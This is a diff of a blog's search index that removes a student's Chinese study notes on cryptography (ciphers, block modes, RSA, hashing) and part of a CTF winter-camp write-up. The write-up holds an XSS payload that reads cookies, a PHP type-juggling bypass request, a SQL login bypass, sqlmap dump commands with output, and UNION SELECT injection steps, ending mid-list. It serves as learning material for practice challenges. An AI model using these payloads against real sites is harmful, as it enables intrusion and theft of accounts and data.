-<p>正当的接收者将密文还原为明文称为“解密”，但接收者以外的其他人试图将密文还原为明文，则称为密码破译( cryptanalysis )，简称为破译，有时也称为密码分析。</p>
-</blockquote>
-<h4 id="对称密码与公钥密码"><a href="#对称密码与公钥密码" class="headerlink" title="对称密码与公钥密码"></a>对称密码与公钥密码</h4><p><img src="https://img.mjj.today/2023/01/28/fddf2ceb003526dcf7df0b66f5676dec.png" alt="fddf2ceb003526dcf7df0b66f5676dec.png"></p>
-<h4 id="隐写术与密码"><a href="#隐写术与密码" class="headerlink" title="隐写术与密码"></a>隐写术与密码</h4><blockquote>
-<p>隐写术的目的是隐藏消息本身，但如果搞清楚了嵌人消息的方法，也就可以搞清楚消息的内容。因此，隐写术并不能代替密码。<br>密码隐藏的是内容，隐写术隐藏的是消息本身。通过将密码与隐写术相结合，就可以同时产生两者所各自具备的效果。</p>
-</blockquote>
-<h4 id="密码与信息安全常识"><a href="#密码与信息安全常识" class="headerlink" title="密码与信息安全常识"></a>密码与信息安全常识</h4><blockquote>
-<p>●不要使用保密的密码算法</p>
-<ol>
-<li>密码算法的秘密早晚都会被公诸于世</li>
-<li>开发高强度的密码算法是非常困难的</li>
-</ol>
-</blockquote>
-<blockquote>
-<p>●使用低强度的密码比不进行任何加密更危险<br>●任何密码总有一天都会被破解（但是量子密码不好说<br>●密码只是信息安全的一部分</p>
-</blockquote>
-<h4 id="小测验"><a href="#小测验" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>发送者Alice接收者Alice<br>小测验2<br>OXXOX</p>
-<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h4 id="恺撒密码"><a href="#恺撒密码" class="headerlink" title="恺撒密码"></a>恺撒密码</h4><blockquote>
-<p>密码算法:将明文中的各个字母按照指定的字母数平移<br>密钥:平移的字母数量</p>
-</blockquote>
-<h4 id="简单替换密码"><a href="#简单替换密码" class="headerlink" title="简单替换密码"></a>简单替换密码</h4><blockquote>
-<p>密码算法:按照替换表对字母表进行替换<br>密钥:替换表</p>
-</blockquote>
-<h4 id="Enigma-通信密码的加密"><a href="#Enigma-通信密码的加密" class="headerlink" title="Enigma(通信密码的加密)"></a>Enigma(通信密码的加密)</h4><blockquote>
-<p>密码算法:使用Enigma密码机，通过接线板的接线方式、3个转子的顺序、每个转子的旋转位置对字母进行替换<br>密钥(每日密码):接线板的接线方式、3个转子的顺序、每个转子的旋转位置</p>
-</blockquote>
-<h4 id="Enigma-通信电文的加密"><a href="#Enigma-通信电文的加密" class="headerlink" title="Enigma (通信电文的加密)"></a>Enigma (通信电文的加密)</h4><blockquote>
-<p>密码算法:使用接线板的接线方式和3个转子的顺序固定的Enigma密码机，按照每个转子的旋转位置对字母进行替换<br>密钥(通信密码):每个转子的旋转位置</p>
-</blockquote>
-<h4 id="小测验-1"><a href="#小测验-1" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>CRYPTOGRAPHY<br>小测验2<br>错<br>小测验3<br><del>不道哇</del></p>
-<h5 id="小测验3答案"><a href="#小测验3答案" class="headerlink" title="小测验3答案"></a>小测验3答案</h5><p>小测验3的答案:没有L的密文<br>明文是一段只有字母L的文字，即LLLLL….发送者的目的是将毫无意义的明文加密发送以干扰密码破译者。<br>然而密码破译者知道Enigma的构造，即无论接线板如何接线，3个转子的顺序和每个转子的旋转位置如何改变，输入的字母都绝对不可能被替换成该字母本身。通过密文中没有L这一事实，密码破译者就能够推测出其明文可能是一串L。<br>此外，密码破译者还能够根据密文的排列组合继续进行破译，从而得到推测Enigma的接线板和转子状态的线索。<br>发送者本想干扰密码破译者，却反而为破译者提供了线索。顺便提一下，破解这一谜题的破译者名叫Mavis Lever，是一位女性。</p>
-<h2 id="第三章：对称密码"><a href="#第三章：对称密码" class="headerlink" title="第三章：对称密码"></a>第三章：对称密码</h2><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><p>加密方式不算很明白，看了个大概<br>不过知道它可以被暴力破解</p>
-<h4 id="三重DES"><a href="#三重DES" class="headerlink" title="三重DES"></a>三重DES</h4><p>增强DES的强度</p>
-<h4 id="AES（Rijndael）"><a href="#AES（Rijndael）" class="headerlink" title="AES（Rijndael）"></a>AES（Rijndael）</h4><p>对称密码算法<br>逐字节替换&gt;向左平移&gt;矩阵运算&gt;XOR</p>
-<p>大家现在都用AES。。</p>
-<h4 id="小测验-2"><a href="#小测验-2" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>小于等于22的+3，大于等于23的-23<br>小测验2<br>错<br>小测验3<br><del>不道哇。。。我猜是E</del><br>小测验4<br><del>OXOXOO</del><br>OXXXOO</p>
-<h5 id="小测验3答案-1"><a href="#小测验3答案-1" class="headerlink" title="小测验3答案"></a>小测验3答案</h5><p><img src="https://img.mjj.today/2023/01/28/d2c62fbe2646bdcc5e72451d8447153a.png" alt="d2c62fbe2646bdcc5e72451d8447153a.png"></p>
-<h5 id="小测验4第3问答案"><a href="#小测验4第3问答案" class="headerlink" title="小测验4第3问答案"></a>小测验4第3问答案</h5><p>如果密钥长度为56比特，那么用暴力破解找到正确密钥需要平均尝试约2^28次。（X）<br>平均尝试次数是密钥总数的大约一半。当密钥长度为56比特时，密钥总数为2^56个，它的一半是2^55（注意，不是指数56变成一半得28，而是减1得55）。<br>因此，当密钥长度为56比特时，平均尝试次数为2^55次，大约相当于3.6x10^16次。</p>
-<h2 id="第四章：分组密码的模式"><a href="#第四章：分组密码的模式" class="headerlink" title="第四章：分组密码的模式"></a>第四章：分组密码的模式</h2><blockquote>
-<p>密码算法可以分为<strong>分组密码</strong>和<strong>流密码</strong>两种。</p>
-</blockquote>
-<blockquote>
-<p>分组密码处理完一个分组 就结束了，因此不需要通过内部状态来记录加密的进度;<br>相对地，流密码是对一串数据流进行连续处理，因此需要保持内部状态。</p>
-</blockquote>
-<blockquote>
-<p>前面提到的算法中，只有一次性密码本属于流密码，而DES、三重DES、AES( Rijndael )等大多数对称密码算法都属于分组密码。</p>
-</blockquote>
-<h4 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h4><p>将明文分组直接加密</p>
-<h5 id="ECB的风险"><a href="#ECB的风险" class="headerlink" title="ECB的风险"></a>ECB的风险</h5><blockquote>
-<p>ECB模式中，每个明文分组都各自独立地进行加密和解密，但这其实是一个很大的弱点。<br>假如存在主动攻击者Mallory，他能够改变密文分组的顺序。当接收者对密文进行解密时，由于密文分组的顺序被改变了，因此相应的明文分组的顺序也会被改变。也就是说，攻击者Mallory无需破译密码就能够操纵明文。在这个场景中，攻击者Mallory不需要破译密码，也不需要知道分组密码算法，他只要知道哪个分组记录了什么样的数据(即电文的格式)就可以了。</p>
-</blockquote>
-<p>btw，我还以为Mallory是女名。。</p>
-<h4 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h4><blockquote>
-<p>首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密</p>
-</blockquote>
-<p><img src="https://img.mjj.today/2023/01/28/383d9d5b787251945de63be98b21e732.png" alt="383d9d5b787251945de63be98b21e732.png"></p>
-<blockquote>
-<p>ECB模式和CBC模式的区别：ECB模式只进行了加密，而CBC模式则在加密之前进行了一次XOR。</p>
-</blockquote>
-<h4 id="CTS"><a href="#CTS" class="headerlink" title="CTS"></a>CTS</h4><p>ECB和CTF混合使用</p>
-<h4 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h4><p><img src="https://img.mjj.today/2023/01/28/91a945dd607f42d856e1ffba256b6f09.png" alt="91a945dd607f42d856e1ffba256b6f09.png"></p>
-<blockquote>
-<p>在CFB模式中，明文数据可以被逐比特加密，因此我们可以将CFB模式看作是一种使用分组密码来实现流密码的方式。</p>
-</blockquote>
-<h4 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h4><p><img src="https://img.mjj.today/2023/01/28/14ebda9ae34cb830ad7c485a89721396.png" alt="14ebda9ae34cb830ad7c485a89721396.png"></p>
-<h4 id="CTR"><a href="#CTR" class="headerlink" title="CTR"></a>CTR</h4><blockquote>
-<p>CTR模式的全称是CounTeR模式(计数器模式)。CTR模式是一种通过将逐次累加的计数器进行加密来生成密钥流的流密码。</p>
-</blockquote>
-<p><img src="https://img.mjj.today/2023/01/28/a55b5490b690e67ce60f1b1e85a73eda.png" alt="a55b5490b690e67ce60f1b1e85a73eda.png"></p>
-<h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><p><img src="https://img.mjj.today/2023/01/28/f36d4213ed567f992f675b7da0f18a48.png" alt="f36d4213ed567f992f675b7da0f18a48.png"></p>
-<h4 id="小测验-3"><a href="#小测验-3" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>16<br>小测验2<br><del>把用户名称和口令错开。。</del><br>小测验3<br><del>能猜出初始化变量。。？</del><br>小测验4<br><del>不道哇。。</del><br>小测验5<br>等于通过XOR加密。。。。？<br>小测验6<br><del>XOXX</del></p>
-<h5 id="小测验2答案"><a href="#小测验2答案" class="headerlink" title="小测验2答案"></a>小测验2答案</h5><p>很多种方式，可以把口令用用户名称覆盖，这样子知道用户名就可以登陆了</p>
-<h5 id="小测验3答案-2"><a href="#小测验3答案-2" class="headerlink" title="小测验3答案"></a>小测验3答案</h5><blockquote>
-<p>在CBC模式中，我们假设永远使用相同的初始化向量。于是，当用同一密钥对同一明文进行加密时，所得到的密文一定是相同的。<br>例如，密码破译者间隔一周收到了两份相同的密文。于是，密码破译者无需破译密码，就可以判断出:这份密文和上周的密文一样，因此两份密文解密所得到的明文也是一样的。<br>如果在每次加密时都改变初始化向量的值，那么即便是用同一密钥对同一明文进行加密，也可以确保每次所得到的密文都不相同。</p>
-</blockquote>
-<h5 id="小测验4答案"><a href="#小测验4答案" class="headerlink" title="小测验4答案"></a>小测验4答案</h5><blockquote>
-<p>Alice的这个模式，实质上等同于ECB模式。</p>
-</blockquote>
-<h5 id="小测验6答案"><a href="#小测验6答案" class="headerlink" title="小测验6答案"></a>小测验6答案</h5><p>怎么能全错哇我要闹了我要闹了好崩溃。。。</p>
-<blockquote>
-<p>在ECB模式的加密中，内容相同的明文分组，一定会被转换为内容相同的密文分组。(O)</p>
-</blockquote>
-<blockquote>
-<p>在CBC模式的解密中，如果密文分组3损坏，则密文分组5是无法正确解密的。(X)<br>密文分组3损坏会导致密文分组3和4无法解密，但密文分组5依然能够正常解密。</p>
-</blockquote>
-<blockquote>
-<p>在CFB模式的加密中，不可以从明文的中间开始加密。(O)<br>正确。如果不是使用CFB模式，而是使用OFB模式或CTR模式的话，就可以从明文的中间开始加密。</p>
-</blockquote>
-<blockquote>
-<p>在OFB模式的解密中，分组密码算法本身所实际执行的是加密操作。(O)<br>正确。在CFB模式、OFB模式和CTR模式中，分组密码算法是用来生成密钥流的，因此，无论是加密还是解密，分组密码算法本身执行的都是相同的操作(加密操作)。</p>
-</blockquote>
-<h2 id="第五章：公钥密码"><a href="#第五章：公钥密码" class="headerlink" title="第五章：公钥密码"></a>第五章：公钥密码</h2><blockquote>
-<p>公钥密码( public-key cryptography )中，密钥分为加密密钥和解密密钥两种。发送者用加密密钥对消息进行加密，接收者用解密密钥对密文进行解密。要理解公钥密码，清楚地区分加密密钥和解密密钥是非常重要的。加密密钥是发送者加密时使用的，而解密密钥则是接收者解密时使用的。</p>
-</blockquote>
-<blockquote>
-<p>仔细思考一下加密密钥和解密密钥的区别，我们可以发现:<br>●发送者只需要加密密钥<br>●接收者只需要解密密钥<br>●解密密钥不可以被窃听者获取<br>●加密密钥被窃听者获取也没问题</p>
-</blockquote>
-<p><strong>公钥密码</strong>：又称<strong>非对称密码</strong><br><strong>加密密钥</strong>：一般为公开，又称<strong>公钥</strong><br><strong>解密密钥</strong>：绝对不能公开，又称<strong>私钥</strong></p>
-<blockquote>
-<p>公钥和私钥是一一 对应的， 一对公钥和私钥统称为密钥对( key pair )。由公钥进行加密的密文，必须使用与该公钥配对的私钥才能够解密。密钥对中的两个密钥之间具有非常密切的关系——数学上的关系——因此公钥 和私钥是不能分别单独生成的。<br>公钥密码的使用者需要生成一个包括公钥和私钥的密钥对，其中公钥会被发送给别人，而私钥则仅供自己使用。</p>
-</blockquote>
-<h4 id="mod运算"><a href="#mod运算" class="headerlink" title="mod运算"></a>mod运算</h4><blockquote>
-<p>A除以B求余数记作 <strong>A mod B</strong></p>
-</blockquote>
-<h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p><img src="https://img.mjj.today/2023/01/28/d9f9829560a460ad3681aa0febebc11f.png" alt="d9f9829560a460ad3681aa0febebc11f.png"></p>
-<p>公钥：(E,N)</p>
-<blockquote>
-<p>E和N这两个数并不是密钥对(公钥和私钥的密钥对)。E和N两个数才组成了一个公钥，因此我们一.般会写成“公钥是(E, N)”或者“公钥是{E,N}”这样的形式，将E和N用括号括起来。</p>
-</blockquote>
-<p><img src="https://img.mjj.today/2023/01/28/d54ea3cbbccdf07c0be47bc1e1ef8aba.png" alt="d54ea3cbbccdf07c0be47bc1e1ef8aba.png"></p>
-<p>私钥：(D,N)</p>
-<p>N：两个质数(p,q)相乘<br>L：(p-1,q-1)的最小公倍数<br>E：1&lt;E&lt;L，E与L互质<br>D：1&lt;D&lt;L，E x D mod &#x3D; 1</p>
-<p><img src="https://img.mjj.today/2023/01/28/915301359b9b3bd856e356bb5119882f.png" alt="915301359b9b3bd856e356bb5119882f.png"></p>
-<hr>
-<p>好好笑这个例子。。放出来乐乐<br><img src="https://img.mjj.today/2023/01/28/f28ef45ddb5d49985638dfd9777c37bb.png" alt="f28ef45ddb5d49985638dfd9777c37bb.png"><br>Mallory在我这已经是是弯恋直求而不得拆散别人的坏女人了（恼<br>（我不管Mallory明明就是女名嘛</p>
-<hr>
-<h4 id="小测验-4"><a href="#小测验-4" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br><del>没必要吧。。Alice知道自己的私钥就好了</del><br>小测验2<br><del>自己也解不开了吧。。？</del><br>小测验3<br><del>9</del><br>小测验4<br><del>OOXXO</del></p>
-<h5 id="小测验错题答案"><a href="#小测验错题答案" class="headerlink" title="小测验错题答案"></a>小测验错题答案</h5><ol>
-<li>这是因为如果将Bob的密钥交给Alice，从此之后(即在本次通信结束之后) Alice就能够对用Bob的密钥加密的密文进行解密。也就是说，对于Bob来说，Alice 有可能成为一个窃听者。</li>
-<li>Alice的方法没有解决三重DES的密钥配送问题。<br>的确，将AES密钥通过三重DES加密后再发送的话，加密后的AES密钥就不怕被窃听。<br>但是，我们还是需要配送加密AES密钥时使用的那个密钥(三重DES的密钥)，否则接收者就无法解密AES密钥。<br>Alice的方法只是把问题转移了而已，并没有真正解决密钥配送问题。</li>
-<li><img src="https://img.mjj.today/2023/01/28/d30e249ddb83af37ba2f375aa912784a.png" alt="d30e249ddb83af37ba2f375aa912784a.png"></li>
-<li>OOXOO<br>(4)一般来说，对称密码的速度比公钥密码要快。</li>
-</ol>
-<h2 id="第六章：混合密码系统"><a href="#第六章：混合密码系统" class="headerlink" title="第六章：混合密码系统"></a>第六章：混合密码系统</h2><blockquote>
-<p>混合密码系统：<br>●用对称密码加密消息<br>●通过伪随机数生成器生成对称密码加密中使用的会话密钥<br>●用公钥密码加密会话密钥<br>●从混合密码系统外部赋予公钥密码加密时使用的密钥</p>
-</blockquote>
-<h4 id="小测验-5"><a href="#小测验-5" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>OXXO</p>
-<h1 id="第二部分：认证"><a href="#第二部分：认证" class="headerlink" title="第二部分：认证"></a>第二部分：认证</h1><h2 id="第七章：单向散列函数"><a href="#第七章：单向散列函数" class="headerlink" title="第七章：单向散列函数"></a>第七章：单向散列函数</h2><blockquote>
-<p><strong>单向散列函数</strong>(one-way hash function)&#x2F;<strong>消息摘要函数</strong>( message digest function )&#x2F;<strong>哈希函数</strong>&#x2F;<strong>杂凑函数</strong>有一个输入和一个输出；<br>其中输入称为<strong>消息</strong>(message)&#x2F;<strong>原像</strong>;<br>输出称为<strong>散列值</strong>(hash value)&#x2F;<strong>消息摘要</strong>&#x2F;<strong>指纹</strong>。</p>
-</blockquote>
-<blockquote>
-<p>单向散列函数可以根据消息的内容计算出散列值，而散列值就可以被用来检查消息的完整性。</p>
-</blockquote>
-<blockquote>
-<p>散列值的长度和消息的长度无关。</p>
-</blockquote>
-<blockquote>
-<p>如果单向散列函数计算出的散列值没有发生变化，那么消息很容易就会被篡改，这个单向散列函数也就无法被用于完整性的检查。两个不同的消息产生同一个散列值的情况称为<strong>碰撞</strong>(collision)。如果要将单向散列函数用于完整性的检查，则需要确保在事实上不可能被人为地发现碰撞。</p>
-</blockquote>
-<blockquote>
-<p>难以发现碰撞的性质称为<strong>抗碰撞性</strong>(collision resistance )。密码技术中所使用的单向散列函数，都需要具备抗碰撞性。</p>
-</blockquote>
-<p>单项散列函数需具备：<br><strong>弱抗碰撞性</strong>：要找到和该条消息具有相同散列值的另外一条消息是非常困难的；<br><strong>强抗碰撞性</strong>：要找到散列值相同的两条不同的消息是非常困难的；<br><strong>单向性</strong>：:无法通过散列值反算出消息的性质。</p>
-]]></content>
-      <categories>
-        <category>学习日记</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>crypto</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ROIS2023冬令营第三周学习记录</title>
     <url>/2023/01/27/ROIS2023%E5%86%AC%E4%BB%A4%E8%90%A5%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<p>（01&#x2F;30更了）学了个寂寞😅<br>后知后觉这是第三周OMG那我第二周干了什么。。。？</p>
@@ -433,215 +135,6 @@
         <tag>CTF</tag>
         <tag>web</tag>
         <tag>crypto</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ROIS冬令营第二周WriteUp</title>
-    <url>/2023/01/25/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E7%AC%AC%E4%BA%8C%E5%91%A8Write-Up/</url>
-    <content><![CDATA[<p>（1.27更了跟没更似的）ROIS冬令营第二周Write Up</p>
-<span id="more"></span>
-<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Week2-XssTest"><a href="#Week2-XssTest" class="headerlink" title="[Week2]XssTest"></a>[Week2]XssTest</h3><p>这题没做出来</p>
-<p>根据hint1可知：</p>
-<blockquote>
-<p>这是DOM型XSS，其与反射型和存储型的区别是XSS代码的解析，不需要服务器解析响应的直接参与，由浏览器的DOM进行解析。名字也是因此得来。</p>
-</blockquote>
-<blockquote>
-<p>DOM型的XSS漏洞不同于反射型和存储型并不经过后台，只是在前端被dom获取到，通过dom又在前端输出了。</p>
-</blockquote>
-<p>根据hint2：</p>
-<blockquote>
-<ol>
-<li>使用JavaScript的document.cookie函数，将cookie输出到页面上；</li>
-<li>将页面的URL地址发送给bot，让bot去截图；</li>
-<li>截图返回后，从截图中提取cookie信息。</li>
-</ol>
-</blockquote>
-<blockquote>
-<p>cookie是一种存储在用户计算机中的小文件，用于跟踪用户的浏览器会话状态，以便网站能够记住用户的设置，如登录状态、语言和其他参数。</p>
-</blockquote>
-<p>尝试构建语句<code>&lt;script&gt;document.write(document.cookie);&lt;/script&gt;</code>失败<br>还试了些别的，不过都没有成功。。这里就不放了</p>
-<p>在网上搜索同类型题时看到一种做法<br><a href="https://blog.csdn.net/weixin_52116519/article/details/124480558">[ctfhub]-xss详解</a><br>然后也用这种办法尝试了，但是cookie那里没有东西出来，猜测可能人家的题是反射型咱这是DOM型（当然还可能是因为别的不过我还在研究</p>
-<h4 id="2023-x2F-01-x2F-26-学习-amp-amp-尝试"><a href="#2023-x2F-01-x2F-26-学习-amp-amp-尝试" class="headerlink" title="2023&#x2F;01&#x2F;26 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;26 学习&amp;&amp;尝试</h4><blockquote>
-<p>使用<code>&lt;script&gt;</code>存在的问题是：页面加载中<code>&lt;script&gt;</code>标签是已经加载过的，通过JavaScript再往页面再写入<code>&lt;script&gt;</code>标签的话，它是不会去执行的。<br><strong>【DOM型XSS和其他XSS的区别之一】</strong></p>
-</blockquote>
-<blockquote>
-<p><code>document.write()</code>可向文档写入文本内容，如果在文档已完成加载后执行 <code>document.write()</code>，整个 HTML 页面将被覆盖。</p>
-</blockquote>
-<p><strong>padload：</strong><br><code>&lt;img src=1 onerror=document.write(document.cookie)&gt;</code><br>。。。吗吖加载了两小时小时终于出来了<br>。。。我不会说我直接图片转文字大写I和小写l全嘎嘎乱出导致我交错了四次但这是事实<br>。。。吗吖我是若汁</p>
-<p>理论上以下几种应该也可以，但是我没成功。。。：<br><code>&lt;img src=document.domain onerror=alert(document.cookie)&gt;</code><br><code>&lt;details open ontoggle=document.write(document.cookie)&gt;</code></p>
-<h3 id="Week2-ez-php-source"><a href="#Week2-ez-php-source" class="headerlink" title="[Week2]ez_php_source"></a>[Week2]ez_php_source</h3><p>用HackBar也能做，不过这里讲BurpSuite</p>
-<p>第一部分：</p>
-<ol>
-<li><code>?b=408</code>；</li>
-<li>改POST；</li>
-<li>加<code>Content-Type: application/x-www-form-urlencoded</code>请求头；</li>
-<li>尾部<code>a=405</code>；</li>
-</ol>
-<p>第二部分：<br>首先了解PHP&#x3D;&#x3D;&#x3D;强弱类型<br><a href="https://blog.csdn.net/m0_56691564/article/details/127380406?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~YuanLiJiHua~Position-2-127380406-blog-109427287.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~YuanLiJiHua~Position-2-127380406-blog-109427287.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=3">ctf中MD5绕过详细总结及例题[BJDCTF2020]Easy MD5</a><br>然后看得出来这里是强类型，使用数组绕过，用&amp;跟a连在一起<br><code>a=405&amp;c[]=1&amp;d[]=2</code></p>
-<p>第三部分：</p>
-<blockquote>
-<p>GET里的变量全都会自动进行urldecode。<br>POST里的变量只有Content-Type: application&#x2F;x-www-form-urlencoded下会自动进行urldecode。</p>
-</blockquote>
-<p>由题意得：<br><code>$_POST[&#39;last1&#39;]==&#39;TheBestLanguage====PHP&#39;</code>；然后加完密的last1等于解密的last2</p>
-<p>可得last2为last1进行urlencode三次</p>
-<p>以下为全部的数据包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?b=408&amp;last2=TheBestLanguage%25253D%25253D%25253D%25253DPHP HTTP/1.1</span><br><span class="line">Host: 。。。。</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 46</span><br><span class="line"></span><br><span class="line">a=405&amp;c[]=1&amp;d[]=2&amp;last1=TheBestLanguage====PHP</span><br></pre></td></tr></table></figure>
-<h4 id="2023-x2F-01-x2F-27-学习-amp-amp-尝试"><a href="#2023-x2F-01-x2F-27-学习-amp-amp-尝试" class="headerlink" title="2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试</h4><p>补个Hackbar的。。其实是一样的<br>GET：<code>http://101.43.57.52:28082/?b=408&amp;last2=TheBestLanguage%253D%253D%253D%253DPHP</code><br>POST：<code>a=405&amp;c[]=1&amp;d[]=2&amp;last1=TheBestLanguage====PHP</code></p>
-<h3 id="Week2-very-easy-sql"><a href="#Week2-very-easy-sql" class="headerlink" title="[Week2]very_easy_sql"></a>[Week2]very_easy_sql</h3><p>首先尝试万能密码<code>admin&#39; or 1=1#</code>,出现<code>用户：why 欢迎登录！</code>字样。</p>
-<p>然后。。。。没思路了（目移）。。。用sqlmap做的，这里写一下sqlmap的过程</p>
-<ol>
-<li>bp抓包，发现是POST类型的，设置<code>username=why&amp;password=1</code>并把提交的数据包保存下来，保存为xxx.txt</li>
-<li>在sqlmap里输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot;</code></li>
-<li>然后出来了一个<code>heuristic (basic) test shows that POST parameter &#39;username&#39; might not be injectable</code>和一个<code>heuristic (basic) test shows that POST parameter &#39;password&#39; might not be injectable</code>表明username和password可能是可注入的</li>
-<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -dbs</code>获取所有数据库<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] ez_sql</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br></pre></td></tr></table></figure></li>
-<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -current-db</code>获得当前数据库<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">current database: &#x27;ez_sql&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -D ez_sql --tables</code>获得数据库ez_sql下的所有表<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: ez_sql</span><br><span class="line">[1 table]</span><br><span class="line">+-------+</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br></pre></td></tr></table></figure></li>
-<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -D ez_sql -T users --columns</code>获取users表里的所有字段<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: ez_sql</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(11)     |</span><br><span class="line">| password | varchar(30) |</span><br><span class="line">| username | varchar(10) |</span><br><span class="line">+----------+-------------+</span><br></pre></td></tr></table></figure></li>
-<li>输入<code>python sqlmap.py -r &quot;文件路径xxx.txt&quot; -D ez_sql -T users -C id,password,username --dump</code>获取字段值<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Database: ez_sql</span><br><span class="line">Table: users</span><br><span class="line">[8 entries]</span><br><span class="line">+----+-------------+----------+</span><br><span class="line">| id | password    | username |</span><br><span class="line">+----+-------------+----------+</span><br><span class="line">| 1  | why         | why      |</span><br><span class="line">| 2  | nobody      | nobody   |</span><br><span class="line">| 3  | does        | does     |</span><br><span class="line">| 4  | misc        | misc     |</span><br><span class="line">| 5  | im          | im       |</span><br><span class="line">| 6  | so          | so       |</span><br><span class="line">| 7  | sad         | sad      |</span><br><span class="line">| 8  | ROIS&#123;*****&#125; | admin    |</span><br><span class="line">+----+-------------+----------+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>sqlmap使用方法参考：<br><a href="https://blog.csdn.net/weixin_43882862/article/details/119673249">CTF刷题–SQL注入（sqlmap）</a><br><a href="https://blog.csdn.net/songbai220/article/details/109303110">sqlmap使用教程(超详细)</a><br><a href="https://blog.csdn.net/weixin_42529890/article/details/107238671">[网络安全自学篇] 二十七.Sqlmap基础用法、CTF实战及请求参数设置（一）</a></p>
-<h4 id="2023-x2F-01-x2F-27-学习-amp-amp-尝试-1"><a href="#2023-x2F-01-x2F-27-学习-amp-amp-尝试-1" class="headerlink" title="2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试</h4><p>按wp顺序过一遍。。显然我自己是不会做的。。</p>
-<ol>
-<li>测测闭合，这里是单引号闭合</li>
-</ol>
-<blockquote>
-<p>闭合判断是进行手动注入的第一步，判断闭合之后就可以开始注入了。</p>
-</blockquote>
-<ol start="2">
-<li>用<code>order by</code>测测有几个表</li>
-</ol>
-<blockquote>
-<p><code>order by</code>是SQL语句中用来指定查询结果按照某个字段排序的语句。</p>
-</blockquote>
-<ol start="3">
-<li><p><code>&#39; order by 3 #</code>是“不存在或密码错误！”<br><code>&#39; order by 4 #</code>是“啊哦，出错了！”<br>易得，表是三列的。</p>
-</li>
-<li><p>由于页面总会返回输入的username信息，所以可以尝试把信息输出到这里。</p>
-</li>
-</ol>
-<blockquote>
-<p><code>union select</code>是一种 SQL 注入技术，用于查询多个表中的数据。它的工作原理是，将多个查询结果合并成一个结果集，以便攻击者可以从数据库中获取敏感信息。</p>
-</blockquote>
-<ol start="5">
-<li><p>输入<code>&#39; union select 1,2,3 #</code>网页输出“用户：2 欢迎登录！”，所有第二列是可以返回信息的。</p>
-</li>
-<li><p>输入<code>admin&#39; union select 1,2,3 #</code>网页输出“用户：admin 欢迎登录！”没有输出“2”，所以要用group_concat将所有结果放在同一行内。</p>
-</li>
-</ol>
-<blockquote>
-<p>group_concat是MySQL数据库的一个函数，它可以将多行查询结果合并为一行，以逗号分隔各个字段。它可以用来检测SQL注入漏洞，因为它可以将多行查询结果合并为一行，以便检测SQL注入漏洞。</p>
-</blockquote>
-<ol start="7">
-<li>输入<code>admin&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata #</code>获得数据库名称</li>
-</ol>
-<blockquote>
-<p>SCHEMA_NAME，表示数据库名称；<br>information_schema.schemata是MySQL中的一个系统表，它存储了数据库中每个数据库的信息，包括数据库名称、字符集和排序规则等。</p>
-</blockquote>
-<ol start="8">
